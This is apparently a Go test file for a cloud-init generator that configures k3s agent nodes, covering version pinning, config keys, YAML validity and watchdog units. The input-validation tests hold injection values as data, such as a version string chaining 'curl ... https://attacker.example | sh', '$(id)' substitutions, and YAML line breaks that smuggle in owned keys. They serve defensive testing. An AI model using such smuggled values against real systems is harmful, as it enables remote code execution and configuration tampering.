package cloudinit

import (
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

var update = flag.Bool("update", false, "rewrite golden files")

const pinnedKubernetesVersion = "v1.35.6+k3s1"

func boolPtr(b bool) *bool { return &b }

func TestRenderK3sIncludesTheContract(t *testing.T) {
	out, err := Render(Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		KubernetesVersion:   pinnedKubernetesVersion,
		Labels:              []string{"horizon.dev/pool=reserved"},
		Taints:              []string{"example.dev/dedicated=batch:NoSchedule"},
		InstallWatchdogUnit: boolPtr(true),
	})
	if err != nil {
		t.Fatalf("unexpected error %v", err)
	}
	for _, want := range []string{
		"#cloud-config",
		"/etc/rancher/k3s/config.yaml",
		"server: https://10.20.0.10:6443",
		"token: ${HORIZON_JOIN_TOKEN}",
		"horizon.dev/pool=reserved",
		"example.dev/dedicated=batch:NoSchedule",
		"${HORIZON_NODE_TOKEN}",
		"--max-lifetime=${HORIZON_MAX_LIFETIME}",
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("generated document is missing %q", want)
		}
	}
}

func TestRenderInstallsKubernetesByDefault(t *testing.T) {
	out, err := Render(Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		KubernetesVersion:   pinnedKubernetesVersion,
		InstallWatchdogUnit: boolPtr(true),
	})
	if err != nil {
		t.Fatalf("unexpected error %v", err)
	}
	if !strings.Contains(out, "get.k3s.io") {
		t.Fatalf("expected the flavour install command, got:\n%s", out)
	}
}

func TestRenderInstallsThePinnedKubernetesVersion(t *testing.T) {
	out, err := Render(Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		KubernetesVersion:   pinnedKubernetesVersion,
		InstallWatchdogUnit: boolPtr(true),
	})
	if err != nil {
		t.Fatalf("unexpected error %v", err)
	}
	want := "curl -sfL https://get.k3s.io | INSTALL_K3S_VERSION=" + pinnedKubernetesVersion + " sh -s - agent"
	if !strings.Contains(out, want) {
		t.Fatalf("the install command does not pin the version, want %q, got:\n%s", want, out)
	}
}

func TestRenderRequiresAKubernetesVersionItWouldInstall(t *testing.T) {
	out, err := Render(Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		InstallWatchdogUnit: boolPtr(true),
	})
	if err == nil {
		t.Fatalf("an unpinned install would take whatever release is newest, got:\n%s", out)
	}
	if !strings.Contains(err.Error(), "--kubernetes-version") {
		t.Errorf("error is %q, want it to name the flag", err)
	}
}

func TestRenderRejectsAKubernetesVersionItWouldNotInstall(t *testing.T) {
	_, err := Render(Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		KubernetesVersion:   pinnedKubernetesVersion,
		InstallKubernetes:   boolPtr(false),
		InstallWatchdogUnit: boolPtr(true),
	})
	if err == nil {
		t.Fatal("expected an error when a version is pinned and no install command is emitted")
	}
	for _, want := range []string{"--kubernetes-version", "--install-kubernetes"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error is %q, want it to name %s", err, want)
		}
	}
}

func TestRenderRejectsAKubernetesVersionTheShellCouldActOn(t *testing.T) {
	tests := []struct {
		name    string
		version string
	}{
		{name: "a chained command", version: "v1.35.6+k3s1; curl -sfL https://attacker.example | sh"},
		{name: "a command substitution", version: "v1.35.6+k3s1$(id)"},
		{name: "a backquoted command", version: "v1.35.6+k3s1`id`"},
		{name: "a line break", version: "v1.35.6+k3s1\nid"},
		{name: "a variable expansion", version: "${HORIZON_JOIN_TOKEN}"},
		{name: "surrounding whitespace", version: " v1.35.6+k3s1 "},
		{name: "an upstream version without the k3s suffix", version: "v1.35.6"},
		{name: "a channel rather than a release", version: "stable"},
		{name: "no version at all", version: "latest"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			out, err := Render(Options{
				Flavor:              "k3s",
				Server:              "https://10.20.0.10:6443",
				KubernetesVersion:   tc.version,
				InstallWatchdogUnit: boolPtr(true),
			})
			if err == nil {
				t.Fatalf("the version reached the install command, got:\n%s", out)
			}
			if !strings.Contains(err.Error(), "--kubernetes-version") {
				t.Errorf("error is %q, want it to name the flag", err)
			}
		})
	}
}

func TestRenderOmitsKubernetesInstallWhenPreinstalled(t *testing.T) {
	out, err := Render(Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		InstallKubernetes:   boolPtr(false),
		InstallWatchdogUnit: boolPtr(true),
	})
	if err != nil {
		t.Fatalf("unexpected error %v", err)
	}
	if strings.Contains(out, "get.k3s.io") {
		t.Fatalf("expected no k3s install command, got:\n%s", out)
	}
	if !strings.Contains(out, "/etc/rancher/k3s/config.yaml") {
		t.Fatalf("expected the flavour config file to survive, got:\n%s", out)
	}
	if !strings.Contains(out, "/var/lib/horizon/bin/horizon") {
		t.Fatalf("expected the watchdog install to survive, got:\n%s", out)
	}
}

func TestRenderRejectsUnknownFlavor(t *testing.T) {
	if _, err := Render(Options{Flavor: "nomad", Server: "https://x:6443", InstallWatchdogUnit: boolPtr(true)}); err == nil {
		t.Fatal("expected an error for an unknown flavour")
	}
}

func TestRenderRequiresServerUnlessPassthrough(t *testing.T) {
	if _, err := Render(Options{Flavor: "k3s", InstallWatchdogUnit: boolPtr(true)}); err == nil {
		t.Fatal("expected an error when no server is set")
	}
}

func TestRenderRequiresWatchdogDecision(t *testing.T) {
	if _, err := Render(Options{Flavor: "k3s", Server: "https://x:6443"}); err == nil {
		t.Fatal("expected an error when InstallWatchdogUnit is not set")
	}
}

func TestRenderPassthroughEmitsNoFlavorContent(t *testing.T) {
	out, err := Render(Options{Passthrough: true, Files: []File{{Path: "/tmp/a", Content: "x"}}, InstallWatchdogUnit: boolPtr(false)})
	if err != nil {
		t.Fatalf("unexpected error %v", err)
	}
	if strings.Contains(out, "/etc/rancher") {
		t.Fatal("passthrough must not emit flavour content")
	}
}

func TestRenderQuotesPermissions(t *testing.T) {
	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, InstallWatchdogUnit: boolPtr(true)})
	if !strings.Contains(out, "permissions: '0600'") {
		t.Fatal("permissions must be a quoted octal string")
	}
}

func TestRenderOmitsWatchdogUnitWhenDisabled(t *testing.T) {
	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, InstallWatchdogUnit: boolPtr(false)})
	if strings.Contains(out, "systemctl enable") {
		t.Fatal("no unit should be installed when the flag is false")
	}
	if !strings.Contains(out, "${HORIZON_NODE_TOKEN}") {
		t.Fatal("the node token file is still required")
	}
}

func TestRenderWritesTransientWatchdogUnitPerBoot(t *testing.T) {
	out, err := Render(Options{
		Flavor:                "k3s",
		Server:                "https://10.20.0.10:6443",
		KubernetesVersion:     pinnedKubernetesVersion,
		InstallWatchdogUnit:   boolPtr(true),
		TransientWatchdogUnit: true,
	})
	if err != nil {
		t.Fatalf("unexpected error %v", err)
	}
	if strings.Contains(out, "/etc/systemd/system/horizon-watchdog.service") {
		t.Fatalf("expected no persistent unit path, got:\n%s", out)
	}
	if !strings.Contains(out, "/run/systemd/system/horizon-watchdog.service") {
		t.Fatalf("expected a transient unit path, got:\n%s", out)
	}
	if strings.Contains(out, "systemctl enable") {
		t.Fatalf("a transient unit cannot be enabled, got:\n%s", out)
	}
	if !strings.Contains(out, "path: /var/lib/cloud/scripts/per-boot/horizon-watchdog") {
		t.Fatalf("expected the unit to be rewritten on every boot, got:\n%s", out)
	}
	if !strings.Contains(out, "permissions: '0755'") {
		t.Fatalf("expected the per-boot script to be executable, got:\n%s", out)
	}
}

func TestRenderRejectsTransientUnitWithoutAUnit(t *testing.T) {
	_, err := Render(Options{
		Flavor:                "k3s",
		Server:                "https://10.20.0.10:6443",
		InstallWatchdogUnit:   boolPtr(false),
		TransientWatchdogUnit: true,
	})
	if err == nil {
		t.Fatal("expected a generation-time error for a transient unit that is also suppressed")
	}
	for _, want := range []string{"--transient-watchdog-unit", "--install-watchdog-unit"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error is %q, want it to name %s", err, want)
		}
	}
}

func TestRenderArmsTheTransientUnitOnTheFirstBoot(t *testing.T) {
	out, err := Render(Options{
		Flavor:                "k3s",
		Server:                "https://10.20.0.10:6443",
		KubernetesVersion:     pinnedKubernetesVersion,
		InstallWatchdogUnit:   boolPtr(true),
		TransientWatchdogUnit: true,
	})
	if err != nil {
		t.Fatalf("unexpected error %v", err)
	}
	script := "/var/lib/cloud/scripts/per-boot/horizon-watchdog"
	if strings.Count(out, script) != 2 {
		t.Fatalf("the per-boot script must be written and then run once the binary exists, got:\n%s", out)
	}
	if !strings.Contains(out, "systemctl start horizon-watchdog.service") {
		t.Fatalf("expected the transient unit to be started, got:\n%s", out)
	}
}

func TestRenderUsesConfiguredBinaryBaseURL(t *testing.T) {
	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, BinaryBaseURL: "https://mirror.internal/horizon", InstallWatchdogUnit: boolPtr(true)})
	if !strings.Contains(out, "https://mirror.internal/horizon") {
		t.Fatal("the configured base URL must be used")
	}
	if strings.Contains(out, "github.com/lucawalz/horizon/releases") {
		t.Fatal("the default must not leak through when overridden")
	}
}

func TestRenderResolvesTheArchitectureOnTheNode(t *testing.T) {
	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, InstallWatchdogUnit: boolPtr(true)})
	for _, want := range []string{
		"ARCH=$(uname -m)",
		"x86_64) ARCH=amd64 ;;",
		"aarch64) ARCH=arm64 ;;",
		"TARBALL=horizon_${NUM}_linux_${ARCH}.tar.gz",
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("the install block is missing %q", want)
		}
	}
	for _, unwanted := range []string{"linux_amd64", "linux_arm64"} {
		if strings.Contains(out, unwanted) {
			t.Fatalf("the install block pins %q instead of resolving the architecture on the node", unwanted)
		}
	}
}

func TestRenderProbesTheInstalledBinary(t *testing.T) {
	out, _ := Render(Options{Flavor: "k3s", Server: "https://x:6443", KubernetesVersion: pinnedKubernetesVersion, InstallWatchdogUnit: boolPtr(true)})
	if !strings.Contains(out, "/var/lib/horizon/bin/horizon version") {
		t.Fatal("the install script must probe the installed binary")
	}
}

func TestK3sFilesCarryExtraConfigKeys(t *testing.T) {
	out, err := Render(Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		KubernetesVersion:   pinnedKubernetesVersion,
		FlavorConfig:        map[string]string{"node-ip": "10.0.0.5", "flannel-iface": "tailscale0"},
		InstallWatchdogUnit: boolPtr(true),
	})
	if err != nil {
		t.Fatalf("unexpected error %v", err)
	}
	if !strings.Contains(out, "flannel-iface: tailscale0") {
		t.Fatalf("expected the extra key in the flavour config, got:\n%s", out)
	}
	if strings.Index(out, "flannel-iface: tailscale0") > strings.Index(out, "node-ip: 10.0.0.5") {
		t.Fatalf("extra keys must be sorted so the document is deterministic, got:\n%s", out)
	}
}

func TestRenderRejectsExtraConfigForOwnedKeys(t *testing.T) {
	for _, key := range []string{"server", "token", "node-label", "node-taint"} {
		_, err := Render(Options{
			Flavor:              "k3s",
			Server:              "https://10.20.0.10:6443",
			KubernetesVersion:   pinnedKubernetesVersion,
			FlavorConfig:        map[string]string{key: "anything"},
			InstallWatchdogUnit: boolPtr(true),
		})
		if err == nil {
			t.Fatalf("expected %q to be rejected as a generator-owned key", key)
		}
		if !strings.Contains(err.Error(), key) {
			t.Errorf("error is %q, want it to name the rejected key %q", err, key)
		}
	}
}

const injectingFlavorConfigValue = "tailscale0\nnode-taint:\n  - injected.dev/x=y:NoSchedule"

func TestRenderRejectsFlavorConfigThatInjectsAnOwnedKey(t *testing.T) {
	out, err := Render(Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		KubernetesVersion:   pinnedKubernetesVersion,
		FlavorConfig:        map[string]string{"flannel-iface": injectingFlavorConfigValue},
		InstallWatchdogUnit: boolPtr(true),
	})
	if err == nil {
		t.Fatalf("a line break routed around the owned-key rejection, got:\n%s", out)
	}
	if !strings.Contains(err.Error(), "--flavor-config") {
		t.Errorf("error is %q, want it to name the flag", err)
	}
}

func TestRenderRejectsFlavorConfigTheDocumentCannotCarry(t *testing.T) {
	tests := []struct {
		name   string
		config map[string]string
	}{
		{name: "a value spanning lines", config: map[string]string{"flannel-iface": injectingFlavorConfigValue}},
		{name: "a value carrying a carriage return", config: map[string]string{"flannel-iface": "tailscale0\rnode-label: injected=true"}},
		{name: "a key spanning lines", config: map[string]string{"flannel-iface: tailscale0\nnode-label": "injected=true"}},
		{name: "a key carrying a colon", config: map[string]string{"flannel-iface: tailscale0": "x"}},
		{name: "a key carrying surrounding whitespace", config: map[string]string{"  flannel-iface": "tailscale0"}},
		{name: "an empty key", config: map[string]string{"": "tailscale0"}},
		{name: "an empty value", config: map[string]string{"flannel-iface": ""}},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			out, err := Render(Options{
				Flavor:              "k3s",
				Server:              "https://10.20.0.10:6443",
				KubernetesVersion:   pinnedKubernetesVersion,
				FlavorConfig:        tc.config,
				InstallWatchdogUnit: boolPtr(true),
			})
			if err == nil {
				t.Fatalf("the flavour configuration was accepted, got:\n%s", out)
			}
			if !strings.Contains(err.Error(), "--flavor-config") {
				t.Errorf("error is %q, want it to name the flag", err)
			}
		})
	}
}

func TestRenderProducesAParsableDocument(t *testing.T) {
	out, err := Render(Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		KubernetesVersion:   pinnedKubernetesVersion,
		Labels:              []string{"horizon.dev/pool=reserved"},
		Files:               []File{{Path: "/etc/motd", Content: "alpha: beta\n"}},
		PostCommands:        []string{"echo done"},
		InstallWatchdogUnit: boolPtr(true),
	})
	if err != nil {
		t.Fatalf("unexpected error %v", err)
	}
	var parsed struct {
		WriteFiles []struct {
			Path    string `yaml:"path"`
			Content string `yaml:"content"`
		} `yaml:"write_files"`
		RunCmd []string `yaml:"runcmd"`
	}
	if err := yaml.Unmarshal([]byte(out), &parsed); err != nil {
		t.Fatalf("generated document does not parse: %v\n%s", err, out)
	}
	if len(parsed.WriteFiles) == 0 || len(parsed.RunCmd) == 0 {
		t.Fatalf("generated document parsed to nothing useful:\n%s", out)
	}
}

func TestRenderRejectsContentTheDocumentCannotCarry(t *testing.T) {
	tests := []struct {
		name string
		opts Options
	}{
		{
			name: "file content whose first line is indented",
			opts: Options{Files: []File{{Path: "/etc/x", Content: "  alpha\nbeta\n"}}},
		},
		{
			name: "file content carrying a leading tab",
			opts: Options{Files: []File{{Path: "/etc/x", Content: "\talpha\nbeta\n"}}},
		},
		{
			name: "a command whose first line is indented",
			opts: Options{PostCommands: []string{"  alpha\nbeta"}},
		},
		{
			name: "a command carrying a leading tab",
			opts: Options{PostCommands: []string{"\talpha\nbeta"}},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			opts := tc.opts
			opts.Passthrough = true
			opts.InstallWatchdogUnit = boolPtr(false)
			out, err := Render(opts)
			if err == nil {
				t.Fatalf("an unparsable document was returned:\n%s", out)
			}
			if !strings.Contains(err.Error(), "not valid YAML") {
				t.Errorf("error is %q, want it to say the document does not parse", err)
			}
		})
	}
}

func TestRenderGolden(t *testing.T) {
	base := Options{
		Flavor:              "k3s",
		Server:              "https://10.20.0.10:6443",
		KubernetesVersion:   pinnedKubernetesVersion,
		Labels:              []string{"horizon.dev/pool=reserved"},
		Taints:              []string{"example.dev/dedicated=batch:NoSchedule"},
		InstallWatchdogUnit: boolPtr(true),
	}
	preinstalled := base
	preinstalled.KubernetesVersion = ""
	preinstalled.InstallKubernetes = boolPtr(false)
	transient := base
	transient.TransientWatchdogUnit = true
	extraConfig := base
	extraConfig.FlavorConfig = map[string]string{"flannel-iface": "tailscale0"}
	prebaked := preinstalled
	prebaked.TransientWatchdogUnit = true
	prebaked.FlavorConfig = map[string]string{"flannel-iface": "tailscale0"}

	tests := []struct {
		golden string
		opts   Options
	}{
		{golden: "k3s-default", opts: base},
		{golden: "k3s-preinstalled-kubernetes", opts: preinstalled},
		{golden: "k3s-transient-watchdog-unit", opts: transient},
		{golden: "k3s-flavor-config", opts: extraConfig},
		{golden: "k3s-prebaked-image", opts: prebaked},
	}

	for _, tc := range tests {
		t.Run(tc.golden, func(t *testing.T) {
			out, err := Render(tc.opts)
			if err != nil {
				t.Fatalf("unexpected error %v", err)
			}
			golden := filepath.Join("testdata", tc.golden+".golden")
			if *update {
				if err := os.WriteFile(golden, []byte(out), 0o644); err != nil {
					t.Fatalf("write golden: %v", err)
				}
			}
			want, err := os.ReadFile(golden)
			if err != nil {
				t.Fatalf("read golden: %v", err)
			}
			if out != string(want) {
				t.Fatalf("generated document changed; rerun with -update if intended")
			}
		})
	}
}
